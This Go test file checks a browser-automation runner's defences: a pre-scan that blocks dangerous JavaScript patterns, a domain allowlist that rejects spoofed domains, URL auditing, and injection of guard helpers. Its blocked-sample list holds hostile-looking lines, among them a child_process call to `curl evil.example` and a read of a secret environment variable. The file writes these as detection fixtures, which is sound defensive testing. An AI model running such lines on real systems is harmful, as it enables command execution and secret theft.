package main

import (
	"encoding/json"
	"os"
	"strings"
	"testing"
)

// 运行时收敛（specs/015 C2）与升级指令（C10）的 runner 侧语义：
//  ① 执行前二次静扫——拦"工作区被篡改/历史脏数据"漏网的已知恶意模式（扫描门镜像）；
//  ② 域名白名单——Go 侧判定与注入 JS 的 __domainAllowed__ 同语义，事件域审计 fail-close；
//  ③ upgrade 帧——官方 `ego-browser upgrade` 的 argv 拼装（能力升级归 ego 官方）。

func TestFirstEntryBlocker(t *testing.T) {
	blocked := map[string]string{
		"require":       `const cp = require("child_process");`,
		"node: 模块":      `import { join } from "node:path";`,
		"child_process": `execSync("curl evil.example");`,
		"动态导入":          `const fs = await import("node:fs/promises");`,
		"eval":          `const x = eval("1+1");`,
		"Function 构造器":  `const f = new Function("return 1");`,
		"process 进程面":   `process.env["SECRET"];`,
	}
	for name, src := range blocked {
		if got := firstEntryBlocker(src); got == "" {
			t.Errorf("恶意样例 %q 必须被运行时预检拦下", name)
		}
	}
	benign := []string{
		`const task = await taskSpace("github 检索");
const page = task.page("p1");
await __gotoChecked__(page, "https://github.com/search?q=ego");
const rows = await page.evaluate(() => [...document.querySelectorAll("article")].length);
console.log(JSON.stringify({ type: "extract", count: rows }));`,
	}
	for i, src := range benign {
		if got := firstEntryBlocker(src); got != "" {
			t.Errorf("良性样例 %d 被误拦（%s）——零误伤纪律", i, got)
		}
	}
}

func TestDomainAllowed(t *testing.T) {
	domains := []string{"github.com", "example.org"}
	cases := []struct {
		url  string
		want bool
		note string
	}{
		{"https://github.com/search?q=ego", true, "精确域"},
		{"https://api.github.com/repos", true, "子域命中"},
		{"https://www.github.com/", true, "www 归一（host 侧 www.github.com 也命中父域）"},
		{"https://evil-github.com/", false, "钓鱼域不得命中（后缀必须带 . 分隔）"},
		{"https://github.com.evil.io/", false, "前缀伪装不得命中"},
		{"https://example.org/a", true, "第二域"},
		{"https://notexample.org/", false, "非声明域拒绝"},
		{"not a url", false, "畸形 URL fail-close"},
		{"", false, "空 URL fail-close"},
	}
	for _, tc := range cases {
		if got := domainAllowed(tc.url, domains); got != tc.want {
			t.Errorf("domainAllowed(%q)=%v want %v（%s）", tc.url, got, tc.want, tc.note)
		}
	}
	if !domainAllowed("https://anything.example/", []string{"*"}) {
		t.Error("整站 * 应放行")
	}
	if domainAllowed("https://example.com/", nil) {
		t.Error("空域单必须全拒（fail-close）")
	}
	if domainAllowed("https://example.com/", []string{"", "  "}) {
		t.Error("全空白域单必须全拒（fail-close）")
	}
}

func TestAuditEventURL(t *testing.T) {
	domains := []string{"github.com"}
	// 带 url 且越域 → 拦
	if _, ok := auditEventURL(domains, json.RawMessage(`{"type":"action","url":"https://evil.io/x"}`)); ok {
		t.Error("越域 URL 必须被审计拦下")
	}
	// 带 url 且在域内 → 放行
	if _, ok := auditEventURL(domains, json.RawMessage(`{"type":"snapshot","url":"https://github.com/x"}`)); !ok {
		t.Error("域内 URL 应放行")
	}
	// 不带 url / 非 JSON / 空 payload → 放行（只审计导航面）
	for _, raw := range []json.RawMessage{
		json.RawMessage(`{"type":"action","ok":true}`),
		json.RawMessage(`not-json`),
		nil,
	} {
		if _, ok := auditEventURL(domains, raw); !ok {
			t.Errorf("无 url 的事件不得被拦: %s", string(raw))
		}
	}
	// 零域单 = 该层未启用（服务端保存时 domains 必填，这里避免误杀老资产）
	if _, ok := auditEventURL(nil, json.RawMessage(`{"url":"https://evil.io/"}`)); !ok {
		t.Error("零域单应跳过审计（该层未启用）")
	}
}

func TestAssembleInjectsDomainContract(t *testing.T) {
	r, _ := newTestRunner(t, "dom-tool", "tools/d.js", "console.log(JSON.stringify({type:'action'}));\n")
	path, cleanup, err := r.assembleScript(taskSpec{
		ExecutionID: "ego-99-1700000000099", AssetID: "dom-tool", Entry: "tools/d.js",
		Origin: "market", Domains: []string{"github.com"},
	})
	if err != nil {
		t.Fatal(err)
	}
	defer cleanup()
	b, err := os.ReadFile(path)
	if err != nil {
		t.Fatal(err)
	}
	got := string(b)
	if !strings.Contains(got, `const __DOMAINS__ = ["github.com"];`) {
		t.Errorf("__DOMAINS__ 未注入:\n%s", got)
	}
	if !strings.Contains(got, "function __domainAllowed__(url)") ||
		!strings.Contains(got, "async function __gotoChecked__(page, url)") ||
		!strings.Contains(got, "async function __fetchChecked__(page, url, opts)") {
		t.Errorf("域守卫 helpers 未注入:\n%s", got)
	}
	// 二次静扫不扫 preamble（helper 自身含 import(...) 与 __fetchChecked__），
	// 只扫 entry：上面 assemble 成功本身就是"preamble 不被预检误杀"的证明。
}

func TestAssembleRejectsBlockedEntryAtRuntime(t *testing.T) {
	r, _ := newTestRunner(t, "bad-tool", "tools/b.js", `const cp = require("child_process"); cp.execSync("x");`)
	_, _, err := r.assembleScript(taskSpec{
		ExecutionID: "ego-100-100", AssetID: "bad-tool", Entry: "tools/b.js", Origin: "market",
	})
	if err == nil || !strings.Contains(err.Error(), "运行时收敛预检") {
		t.Fatalf("恶意 entry 必须在组装时被拒（fail-close），err=%v", err)
	}
}

func TestEgoUpgradeArgs(t *testing.T) {
	plain := egoUpgradeArgs(&runnerConf{})
	if len(plain) != 1 || plain[0] != "upgrade" {
		t.Errorf("无 server_name 应只有 upgrade 子命令，实际 %v", plain)
	}
	named := egoUpgradeArgs(&runnerConf{EgoServerName: "work-a"})
	if len(named) != 2 || named[0] != "--ego-server-name=work-a" || named[1] != "upgrade" {
		t.Errorf("--ego-server-name 必须前置，实际 %v", named)
	}
}
